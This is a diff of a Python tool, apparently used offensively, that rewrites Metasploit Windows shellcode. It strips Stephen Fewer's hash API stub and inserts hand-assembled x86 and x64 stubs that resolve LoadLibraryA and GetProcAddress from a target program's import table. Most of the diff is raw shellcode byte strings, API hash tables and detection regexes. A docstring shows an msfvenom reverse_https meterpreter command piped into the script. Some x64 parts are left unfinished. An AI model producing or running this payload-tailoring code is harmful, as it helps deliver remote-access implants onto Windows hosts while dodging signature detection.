@@ -24,8 +24,6 @@ CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 POSSIBILITY OF SUCH DAMAGE.
 '''
-
-
 from __future__ import print_function
 from collections import OrderedDict
 from capstone import *
@@ -43,6 +41,19 @@ import signal
 import json
 import os
 import ntpath
+
+
+'''
+Notes:
+- going to need to x64 Disassembling
+- need to write the stubs (do this first, the rest is easy)
+- Flow:
+    * look at inputted shellcode (is x86 or x64) based on Stephen Fewers hash api
+    * do what x86 code does, but for x64
+
+
+'''
+
 
 def signal_handler(signal, frame):
         print('\nProgram Exit')
@@ -97,12 +108,13 @@ Four options:
                     )
 parser.add_argument('-n', '--donotfail', dest='dontfail', action='store_true', default=False,
                     help='Default: Fail if Stephen Fewers Hash API stub is not there, use -n to bypass')
+parser.add_argument('-M', '--mode', default='', dest='mode', action='store',
+                    help='ASM mode 32 or 64')
 
 args = parser.parse_args()
 
 
 
-#print("DEBUG ARGS:", args, args.infile.buffer.seekable())
 if args.infile.buffer.seekable() is False:
     # READ from stdin because content is there
     args.code = args.infile.buffer.read()
@@ -112,98 +124,12 @@ if not args.code:
     parser.print_help()
     sys.exit(-1)     
 
-class x86_windows_metasploit:
-    
-    '''
-    Inputs:
-        Any metasploit source windows x86 shellcode/payload that 
-        employs Stephen Fewers hash api STUB.
-         msfvenom -p windows/meterpreter/reverse_https LHOST=127.0.0.1 PORT=8080 EXIT=Process | 
-         ./thisscript.py <optional binary of shellcode> <optional targetbinary> <optional operating system target> <optional dll name as the target> 
-         optional targetbinary = by default it will assume LoadLibraryA and GetProcAddress is in the target Import Address Table (IAT). If 
-            the target binary is provided it will look at the imported DLLs from the windows OS to determine if their IATs contain 
-            LLA/GPA or just GPA and use that.
 
+class stubs_32:
 
-         Optional target OS: default Win7.
-
-
-    Outputs:
-        A payload tailored to that binary - in c, csharp, binary, bin file outputs.
-
-    '''
-
-    def __init__(self, **kwargs):
-        self.__dict__.update(kwargs)
-        self.tracker = []
-        self.arch = CS_ARCH_X86
-        self.mode = CS_MODE_32
-        self.syntax = 0
-        self.api_hashes = {}
-        self.called_apis = []
-        self.string_table = ''
-        self.tracker_dict = {}
-        self.block_order = []
-        self.DLL_HASH = 0
-        self.lla_hash_dict = {}
-        self.gpa_hash_dict = {}
+    def __init__(self, impts):
+        self.impts = impts
         
-        if self.OUTPUT == 'stdout':
-            # suppress print
-            self.VERBOSE = False
-        
-        # Length 136
-        self.fewerapistub = bytes("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
-                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
-                            "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
-                            "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
-                            "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
-                            "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
-                            "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
-                            "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
-                            "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
-                            "\x8d", 'iso-8859-1')
-
-        
-        
-        # This hash list could be longer
-
-        self.hashes = [  ( 0x006B8029, "ws2_32.dll!WSAStartup" ),
-                         ( 0xE0DF0FEA, "ws2_32.dll!WSASocketA" ),
-                         ( 0x33BEAC94, 'ws2_32.dll!WSAaccept'),
-                         ( 0x6737DBC2, "ws2_32.dll!bind" ),
-                         ( 0xFF38E9B7, "ws2_32.dll!listen" ),
-                         ( 0xE13BEC74, "ws2_32.dll!accept" ),
-                         ( 0x614D6E75, "ws2_32.dll!closesocket" ),
-                         ( 0x6174A599, "ws2_32.dll!connect" ),
-                         ( 0x5FC8D902, "ws2_32.dll!recv" ),
-                         ( 0x5F38EBC2, "ws2_32.dll!send" ),
-                         ( 0x5BAE572D, "kernel32.dll!WriteFile" ),
-                         ( 0x4FDAF6DA, "kernel32.dll!CreateFileA" ),
-                         ( 0x13DD2ED7, "kernel32.dll!DeleteFileA" ),
-                         ( 0xE449F330, "kernel32.dll!GetTempPathA" ),
-                         ( 0x528796C6, "kernel32.dll!CloseHandle" ),
-                         ( 0x863FCC79, "kernel32.dll!CreateProcessA" ),
-                         ( 0xE553A458, "kernel32.dll!VirtualAlloc" ),
-                         ( 0x300F2F0B, "kernel32.dll!VirtualFree" ),
-                         ( 0x0726774C, "kernel32.dll!LoadLibraryA" ),
-                         ( 0x7802F749, "kernel32.dll!GetProcAddress" ),
-                         ( 0x601D8708, "kernel32.dll!WaitForSingleObject" ),
-                         ( 0x876F8B31, "kernel32.dll!WinExec" ),
-                         ( 0x9DBD95A6, "kernel32.dll!GetVersion" ),
-                         ( 0xEA320EFE, "kernel32.dll!SetUnhandledExceptionFilter" ),
-                         ( 0x56A2B5F0, "kernel32.dll!ExitProcess" ),
-                         ( 0x0A2A1DE0, "kernel32.dll!ExitThread" ),
-                         ( 0x6F721347, "ntdll.dll!RtlExitUserThread" ),
-                         ( 0x23E38427, "advapi32.dll!RevertToSelf" ),
-                         ( 0xa779563a, "wininet.dll!InternetOpenA"),
-                         ( 0xc69f8957, "wininet.dll!InternetConnectA"),
-                         ( 0x3B2E55EB, "wininet.dll!HttpOpenRequestA"),
-                         ( 0x869E4675, "wininet.dll!InternetSetOptionA"),
-                         ( 0x7B18062D, "wininet.dll!HttpSendRequestA"),
-                         ( 0xE2899612, "wininet.dll!InternetReadFile"),
-              ]    
-
     def lla_gpa_parser_stub(self):
         self.parser_stub = 'LLAGPA'
         self.importname = 'main_module'
@@ -225,7 +151,7 @@ class x86_windows_metasploit:
                "\x03\xd3"                           # add edx, ebx                          ;Offset in memory
                "\x81\x3a\x4b\x45\x52\x4e"           # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
                "\x75\x09"                           # JE short 
-               "\x81\x7A\x04\x45\x4C\x33\x32"       # CMP DWORD PTR DS:[EDX+4],32334C45 ; el32
+               "\x81\x7A\x04\x45\x4C\x33\x32"       # CMP DWORD PTR DS:[EDX+4],32334C45     ; el32
                "\x74\x05"                           # je 0x102f                             ;jmp saveBase
                "\x83\xc7\x14"                       # add edi, 0x14                         ;inc to next import
                "\xeb\xe5"                           # jmp 0x101d                            ;Jmp findImport
@@ -285,7 +211,7 @@ class x86_windows_metasploit:
                # LLA in EBX
                # GPA EBP
         return shellcode 
-     
+ 
     def gpa_parser_stub(self): 
         self.parser_stub = 'GPA'
         self.importname = 'main_module'
@@ -296,7 +222,7 @@ class x86_windows_metasploit:
                "\x64\x8b\x52\x30"                   # mov edx, dword ptr fs:[edx + 0x30]    ;PEB
                "\x8b\x52\x08"                       # mov edx, dword ptr [edx + 8]          ;PEB.imagebase
                "\x8b\xda"                           # mov ebx, edx                          ;Set ebx to imagebase
-               #"\x8b\xc3"                          # mov eax, ebx                         ;Set eax to imagebase
+               #"\x8b\xc3"                          # mov eax, ebx                          ;Set eax to imagebase
                "\x03\x52\x3c"                       # add edx, dword ptr [edx + 0x3c]       ;"PE"
                "\x8b\xba\x80\x00\x00\x00"           # mov edi, dword ptr [edx + 0x80]       ;Import Table RVA
                "\x03\xfb"                           # add edi, ebx                          ;Import table in memory offset
@@ -400,7 +326,7 @@ class x86_windows_metasploit:
         return shellcode 
         # LOADLIBA in EBX
         # GETPROCADDR in EBP
-        
+    
     def loaded_lla_gpa_parser_stub(self):
         self.parser_stub = 'ExternLLAGPA'
         
@@ -430,7 +356,7 @@ class x86_windows_metasploit:
               , 'iso-8859-1')
 
         shellcode2 = b"\x81\xff"
-        shellcode2 += struct.pack("<I", self.DLL_INFO['hash'])
+        shellcode2 += struct.pack("<I", self.impts.DLL_INFO['hash'])
     
         shellcode3 = bytes("\x8b\x5a\x10"           # mov ebx,[edx+0x10]
              "\x8b\x12"                             # mov edx,[edx]
@@ -444,7 +370,7 @@ class x86_windows_metasploit:
              "\x8b\x57\x0c"                         # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
              "\x03\xd3"                             # add edx, ebx                          ;Offset in memory
              , 'iso-8859-1')
-        if self.DLL_INFO['importname'] == 'kernel32.dll':
+        if self.impts.DLL_INFO['importname'] == 'kernel32.dll':
             shellcode3 += (
            b"\x81\x3a\x4b\x45\x52\x4e"               # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
            b"\x75\x09"                               # JE short
@@ -453,7 +379,7 @@ class x86_windows_metasploit:
            b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
            b"\xeb\xe5"                               # jmp 0x101d                            ; Jmp findImport
            )
-        elif 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower():
+        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
             shellcode3 += (
            b"\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
            b"\x75\x09"
@@ -463,7 +389,7 @@ class x86_windows_metasploit:
            b"\xeb\xe4"                               # jmp 0x101d                            ; Jmp findImport
           )
         else:
-            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
             sys.exit(-1)
         
         shellcode3 += bytes(
@@ -497,9 +423,9 @@ class x86_windows_metasploit:
              "\xeb\xda"                             # jmp short 0x77
              , 'iso-8859-1')
              # loadApis     
-        if self.DLL_INFO['importname'].lower() == 'kernel32.dll':
+        if self.impts.DLL_INFO['importname'].lower() == 'kernel32.dll':
             shellcode3 += b"\x68\x61\x72\x79\x41"                 # push dword 0x41797261 ; raryA
-        elif 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower():
+        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
             shellcode3 += b"\x68\x61\x72\x79\x45"
         else:
             sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
@@ -553,7 +479,7 @@ class x86_windows_metasploit:
             , "iso-8859-1")
         
         shellcode2 = b"\x81\xff"                    # cmp edi, DLL_HASH
-        shellcode2 += struct.pack("<I", self.DLL_INFO['hash'])                          
+        shellcode2 += struct.pack("<I", self.impts.DLL_INFO['hash'])                          
     
     
         shellcode3 = bytes("\x8b\x5a\x10"           # mov ebx,[edx+0x10]        ; move module handle addr to ebx
@@ -568,7 +494,7 @@ class x86_windows_metasploit:
             "\x8b\x57\x0c"                          # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
             "\x03\xd3"                              # add edx, ebx                          ;Offset in memory
             , 'iso-8859-1')                            
-        if self.DLL_INFO['importname'] == 'kernel32.dll':
+        if self.impts.DLL_INFO['importname'] == 'kernel32.dll':
             shellcode3 += (
            b"\x81\x3a\x4b\x45\x52\x4e"               # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
            b"\x75\x09"                               # JE short 
@@ -577,7 +503,7 @@ class x86_windows_metasploit:
            b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
            b"\xeb\xe5"                               # jmp 0x101d                            ; Jmp findImport
            )
-        elif 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower():
+        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
             shellcode3 += (
            b"\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
            b"\x75\x09"
@@ -587,7 +513,7 @@ class x86_windows_metasploit:
            b"\xeb\xe4"                               # jmp 0x101d                            ; Jmp findImport
           )
         else:
-            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
             sys.exit(-1)
 
         shellcode3 += bytes(
@@ -676,6 +602,302 @@ class x86_windows_metasploit:
     
         return shellcode1 + shellcode2 + shellcode3
 
+    #add gpafc stub here
+
+
+class stubs_64:
+
+    def __init__(self, impts):
+        self.impts = impts
+    
+    def lla_gpa_parser_stub(self):
+        parser_stub = 'LLAGPA'
+        importname = 'main_module'
+
+        shellcode = bytes(
+                "\xfc"                                              # cld 
+                "\x48\x83\xE4\xF0"                                  # and rsp, 0xfffffffffffffff0
+                #"\x48\x83\xEC\x20"                                 # sub rsp, 20
+                "\x41\x51"                                          # push r9
+                "\x41\x50"                                          # push r8
+                "\x52"                                              # push rdx
+                "\x51"                                              # push rcx
+                "\x56"                                              # push rsi
+                "\x48\x31\xd2"                                      # xor rdx, rdx
+                "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+                "\x48\x8b\x52\x10"                                  # mov rdx, qword ptr [rdx + 0x10]
+                "\x48\x89\xd3"                                      # mov rbx, rdx
+                "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
+                "\x48\x01\xc2"                                      # add rdx, rax
+                "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
+                "\x48\x01\xdf"                                      # add rdi, rbx
+                "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
+                "\x48\x01\xda"                                      # add rdx, rbx
+                "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
+                "\x75\x09"                                          # jne 0x3e
+                "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
+                "\x74\x06"                                          # je 0x44
+                "\x48\x83\xc7\x14"                                  # add rdi, 0x14
+                "\xeb\xe3"                                          # jmp 0x27
+                "\x57"                                              # push rdi
+                "\xeb\x46"                                          # jmp 0x8d
+                "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
+                "\x48\x01\xda"                                      # add rdx, rbx
+                "\x8b\x37"                                          # mov esi, dword ptr [rdi]
+                "\x48\x01\xde"                                      # add rsi, rbx
+                "\x48\x89\xd1"                                      # mov rcx, rdx
+                "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
+                "\x48\x31\xed"                                      # xor rbp, rbp
+                "\x8b\x06"                                          # mov eax, dword ptr [rsi]
+                "\x48\x01\xd8"                                      # add rax, rbx
+                "\x48\x83\xc0\x02"                                  # add rax, 2
+                "\x48\x39\xc1"                                      # cmp rcx, rax
+                "\x72\x17"                                          # jb 0x84
+                "\x48\x39\xd0"                                      # cmp rax, rdx
+                "\x72\x12"                                          # jb 0x84
+                "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
+                "\x39\x38"                                          # cmp dword ptr [rax], edi
+                "\x75\x0a"                                          # jne 0x84
+                "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
+                "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
+                "\x75\x01"                                          # jne 0x84
+                "\xc3"                                              # ret 
+                "\x83\xc5\x04"                                      # add ebp, 4
+                "\x48\x83\xc6\x04"                                  # add rsi, 4
+                "\xeb\xd2"                                          # jmp 0x5f
+                "\x68\x61\x72\x79\x41"                              # push 0x41797261
+                "\x68\x4c\x6f\x61\x64"                              # push 0x64616f4c
+                "\xe8\xab\xff\xff\xff"                              # call 0x47
+                "\x48\x01\xea"                                      # add rdx, rbp
+                "\x48\x83\xc4\x10"                                  # add rsp, 0x10
+                "\x5f"                                              # pop rdi
+                "\x52"                                              # push rdx
+                "\x68\x64\x64\x72\x65"                              # push 0x65726464
+                "\x68\x47\x65\x74\x50"                              # push 0x50746547
+                "\xe8\x93\xff\xff\xff"                              # call 0x47
+                "\x48\x01\xea"                                      # add rdx, rbp
+                "\x5d"                                              # pop rbp
+                "\x5d"                                              # pop rbp
+                "\x5b"                                              # pop rbx
+                "\x48\x89\xd5"                                      # mov rbp, rdx
+
+                , 'iso-8859-1')
+        return shellcode
+
+    def gpa_parser_stub(self):
+        shellcode = bytes(
+            "\xfc"                                              # cld 
+            "\x41\x51"                                          # push r9
+            "\x41\x50"                                          # push r8
+            "\x52"                                              # push rdx
+            "\x51"                                              # push rcx
+            "\x56"                                              # push rsi
+            "\x48\x31\xd2"                                      # xor rdx, rdx
+            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+            "\x48\x8b\x52\x10"                                  # mov rdx, qword ptr [rdx + 0x10]
+            "\x48\x89\xd3"                                      # mov rbx, rdx
+            "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
+            "\x48\x01\xc2"                                      # add rdx, rax
+            "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
+            "\x48\x01\xdf"                                      # add rdi, rbx
+            "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
+            "\x48\x01\xda"                                      # add rdx, rbx
+            "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
+            "\x75\x09"                                          # jne 0x3e
+            "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
+            "\x74\x06"                                          # je 0x44
+            "\x48\x83\xc7\x14"                                  # add rdi, 0x14
+            "\xeb\xe3"                                          # jmp 0x27
+            "\x57"                                              # push rdi
+            "\xeb\x46"                                          # jmp 0x8d
+            "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
+            "\x48\x01\xda"                                      # add rdx, rbx
+            "\x8b\x37"                                          # mov esi, dword ptr [rdi]
+            "\x48\x01\xde"                                      # add rsi, rbx
+            "\x48\x89\xd1"                                      # mov rcx, rdx
+            "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
+            "\x48\x31\xed"                                      # xor rbp, rbp
+            "\x8b\x06"                                          # mov eax, dword ptr [rsi]
+            "\x48\x01\xd8"                                      # add rax, rbx
+            "\x48\x83\xc0\x02"                                  # add rax, 2
+            "\x48\x39\xc1"                                      # cmp rcx, rax
+            "\x72\x17"                                          # jb 0x84
+            "\x48\x39\xd0"                                      # cmp rax, rdx
+            "\x72\x12"                                          # jb 0x84
+            "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
+            "\x39\x38"                                          # cmp dword ptr [rax], edi
+            "\x75\x0a"                                          # jne 0x84
+            "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
+            "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
+            "\x75\x01"                                          # jne 0x84
+            "\xc3"                                              # ret 
+            "\x83\xc5\x04"                                      # add ebp, 4
+            "\x48\x83\xc6\x04"                                  # add rsi, 4
+            "\xeb\xd2"                                          # jmp 0x5f
+            "\x52"                                              # push rdx
+            "\x68\x64\x64\x72\x65"                              # push 0x65726464
+            "\x68\x47\x65\x74\x50"                              # push 0x50746547
+            "\xe8\xaa\xff\xff\xff"                              # call 0x47
+            "\x48\x01\xea"                                      # add rdx, rbp
+            "\x5d"                                              # pop rbp
+            "\x5d"                                              # pop rbp
+            "\x48\x89\xd5"                                      # mov rbp, rdx
+            "\x48\x31\xd2"                                      # xor rdx, rdx
+            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
+            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
+            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
+            "\x6a\x18"                                          # push 0x18
+            "\x59"                                              # pop rcx
+            "\x4d\x31\xc9"                                      # xor r9, r9
+            "\x48\x31\xc0"                                      # xor rax, rax
+            "\xac"                                              # lodsb al, byte ptr [rsi]
+            "\x3c\x61"                                          # cmp al, 0x61
+            "\x7c\x02"                                          # jl 0xc9
+            "\x2c\x20"                                          # sub al, 0x20
+            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
+            "\x41\x01\xc1"                                      # add r9d, eax
+            "\xe2\xed"                                          # loop 0xbf
+            "\x49\x81\xf9\x5b\xbc\x4a\x6a"                      # cmp r9, 0x6a4abc5b
+            "\x48\x8b\x5a\x20"                                  # mov rbx, qword ptr [rdx + 0x20]
+            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
+            "\x75\xd3"                                          # jne 0xb5
+            "\x6a\x00"                                          # push 0
+            "\x6a\x00"                                          # push 0
+            "\xc7\x44\x24\x08\x61\x72\x79\x41"                  # mov dword ptr [rsp + 8], 0x41797261
+            "\xc7\x44\x24\x04\x4c\x69\x62\x72"                  # mov dword ptr [rsp + 4], 0x7262694c
+            "\xc7\x04\x24\x4c\x6f\x61\x64"                      # mov dword ptr [rsp], 0x64616f4c
+            "\x48\x89\xe2"                                      # mov rdx, rsp
+            "\x48\x89\xd9"                                      # mov rcx, rbx
+            "\x48\x83\xec\x20"                                  # sub rsp, 0x20
+            "\xff\x55\x00"                                      # call qword ptr [rbp]
+            "\x50"                                              # push rax
+            "\x48\x89\xe3"                                      # mov rbx, rsp
+            "\x48\x83\xc4\x40"                                  # add rsp, 0x40
+            , 'iso-8859-1')
+
+        return shellcode
+
+    def loaded_lla_gpa_parser_stub(self):
+        pass
+
+    def loaded_gpa_iat_parser_stub(self):
+        pass
+
+
+class x86_windows_metasploit:
+    
+    '''
+    Inputs:
+        Any metasploit source windows x86 shellcode/payload that 
+        employs Stephen Fewers hash api STUB.
+         msfvenom -p windows/meterpreter/reverse_https LHOST=127.0.0.1 PORT=8080 EXIT=Process | 
+         ./thisscript.py <optional binary of shellcode> <optional targetbinary> <optional operating system target> <optional dll name as the target> 
+         optional targetbinary = by default it will assume LoadLibraryA and GetProcAddress is in the target Import Address Table (IAT). If 
+            the target binary is provided it will look at the imported DLLs from the windows OS to determine if their IATs contain 
+            LLA/GPA or just GPA and use that.
+
+
+         Optional target OS: default Win7.
+
+
+    Outputs:
+        A payload tailored to that binary - in c, csharp, binary, bin file outputs.
+
+    '''
+
+    def __init__(self, **kwargs):
+        self.__dict__.update(kwargs)
+        self.tracker = []
+        self.arch = CS_ARCH_X86
+        #self.mode = ''
+        self.syntax = 0
+        self.api_hashes = {}
+        self.called_apis = []
+        self.string_table = ''
+        self.tracker_dict = {}
+        self.block_order = []
+        self.DLL_HASH = 0
+        self.lla_hash_dict = {}
+        self.gpa_hash_dict = {}
+        sys.stderr.write("self.mode %s\n" % self.mode)
+        if self.mode == '32':
+            self.mode = CS_MODE_32
+        elif self.mode == '64':
+            self.mode = CS_MODE_64
+
+        
+        if self.OUTPUT == 'stdout':
+            # suppress print
+            self.VERBOSE = False
+        
+        # Length 136
+        self.fewerapistub_x86 = bytes("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+                            "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+                            "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+                            "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
+                            "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
+                            "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
+                            "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+                            "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
+                            "\x8d", 'iso-8859-1')
+
+        self.fewerapistub_x64 = bytes("\x41\x51\x41\x50\x52\x51"
+                            "\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52"
+                            "\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
+                            "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed"
+                            "\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01", 'iso-8859-1')
+
+        self.fewerapistub_x64_regex = bytes("\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
+                                            "\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48"
+                                            "\x0f\xb7\x4a\x4a(.*?)\xe9.\xff\xff\xff", 
+                                            'iso-8859-1'
+                                            )
+
+                                            
+                                            #"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41"
+                                            #"\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0(.*?)\xe9.\xff\xff\xff", 
+                                            #'iso-8859-1')
+                              
+        # This hash list could be longer
+
+        self.hashes = [  ( 0x006B8029, "ws2_32.dll!WSAStartup" ),
+                         ( 0xE0DF0FEA, "ws2_32.dll!WSASocketA" ),
+                         ( 0x33BEAC94, 'ws2_32.dll!WSAaccept'),
+                         ( 0x6737DBC2, "ws2_32.dll!bind" ),
+                         ( 0xFF38E9B7, "ws2_32.dll!listen" ),
+                         ( 0xE13BEC74, "ws2_32.dll!accept" ),
+                         ( 0x614D6E75, "ws2_32.dll!closesocket" ),
+                         ( 0x6174A599, "ws2_32.dll!connect" ),
+                         ( 0x5FC8D902, "ws2_32.dll!recv" ),
+                         ( 0x5F38EBC2, "ws2_32.dll!send" ),
+                         ( 0x5BAE572D, "kernel32.dll!WriteFile" ),
+                         ( 0x4FDAF6DA, "kernel32.dll!CreateFileA" ),
+                         ( 0x13DD2ED7, "kernel32.dll!DeleteFileA" ),
+                         ( 0xE449F330, "kernel32.dll!GetTempPathA" ),
+                         ( 0x528796C6, "kernel32.dll!CloseHandle" ),
+                         ( 0x863FCC79, "kernel32.dll!CreateProcessA" ),
+                         ( 0xE553A458, "kernel32.dll!VirtualAlloc" ),
+                         ( 0x300F2F0B, "kernel32.dll!VirtualFree" ),
+                         ( 0x0726774C, "kernel32.dll!LoadLibraryA" ),
+                         ( 0x7802F749, "kernel32.dll!GetProcAddress" ),
+                         ( 0x601D8708, "kernel32.dll!WaitForSingleObject" ),
+                         ( 0x876F8B31, "kernel32.dll!WinExec" ),
+                         ( 0x9DBD95A6, "kernel32.dll!GetVersion" ),
+                         ( 0xEA320EFE, "kernel32.dll!SetUnhandledExceptionFilter" ),
+                         ( 0x56A2B5F0, "kernel32.dll!ExitProcess" ),
+                         ( 0x0A2A1DE0, "kernel32.dll!ExitThread" ),
+                         ( 0x6F721347, "ntdll.dll!RtlExitUserThread" ),
+                         ( 0x23E38427, "advapi32.dll!RevertToSelf" ),
+                         ( 0xa779563a, "wininet.dll!InternetOpenA"),
+                         ( 0xc69f8957, "wininet.dll!InternetConnectA"),
+                         ( 0x3B2E55EB, "wininet.dll!HttpOpenRequestA"),
+                         ( 0x869E4675, "wininet.dll!InternetSetOptionA"),
+                         ( 0x7B18062D, "wininet.dll!HttpSendRequestA"),
+                         ( 0xE2899612, "wininet.dll!InternetReadFile"),
+              ]    
+
     ###############################
     #Modified from Stephen Fewer's hash.py 
     ###############################
@@ -698,7 +920,7 @@ class x86_windows_metasploit:
         if len(module) > 12:
             module += module[:12]
         for c in self.unicode(module):
-            #print '\t', c.encode('hex')
+            
             module_hash = self.ror(module_hash, bits)
             module_hash += ord(c)
         
@@ -714,9 +936,10 @@ class x86_windows_metasploit:
                 self.called_apis.append(ahash[1])
                 # mangle hash here
                 if self.mangle is True:
-                    sys.stderr.write('[*] Mangling {0} call hash\n'.format(ahash[1]))
+                    sys.stderr.write('[*] Mangling {0} call hash: '.format(ahash[1]))
                     random_hash = random.randint(1, 4228250625)
                     self.api_hashes[random_hash] = ahash[1]
+                    sys.stderr.write('{0}\n'.format(hex(random_hash)))
                     return ahash[1], random_hash # return managed hash here
                 else:
                     self.api_hashes[ahash[0]] = ahash[1]
@@ -725,33 +948,51 @@ class x86_windows_metasploit:
         return None, None
 
     def get_it_in_order(self):
-        sys.stderr.write("[*] Length of submitted payload:{0}\n".format(len(self.code)))
+        sys.stderr.write("[*] Length of submitted payload: {0}\n".format(hex(len(self.code))))
         self.replace_string = b''
 
-        if self.fewerapistub in self.code:
+        if self.fewerapistub_x86 in self.code:
                 #strip it
-                sys.stderr.write("[*] Stripping Stephen Fewers hash API call\n")
-                self.code = self.code.replace(self.fewerapistub, b'')
+                sys.stderr.write("[*] Stripping Stephen Fewers 32bit hash stub \n")
+                self.code = self.code.replace(self.fewerapistub_x86, b'')
                 self.prestine_code = self.code
-                #print("metasploit payload:", binascii.hexlify(self.code))
+                self.mode = CS_MODE_32
+        
+                
+        elif self.fewerapistub_x64 in self.code:
+                sys.stderr.write("[*] Stripping Stripping Fewers 64bit hash stub \n")
+                #strip off cld, and rsp, 0xfff..0, call XX (yay x64)
+                
+                #self.code = self.code[10:]
+                #now remove SFH stub
+                self.code = re.sub(self.fewerapistub_x64_regex, b'', self.code[10:])
+                sys.stderr.write(self.code.hex())
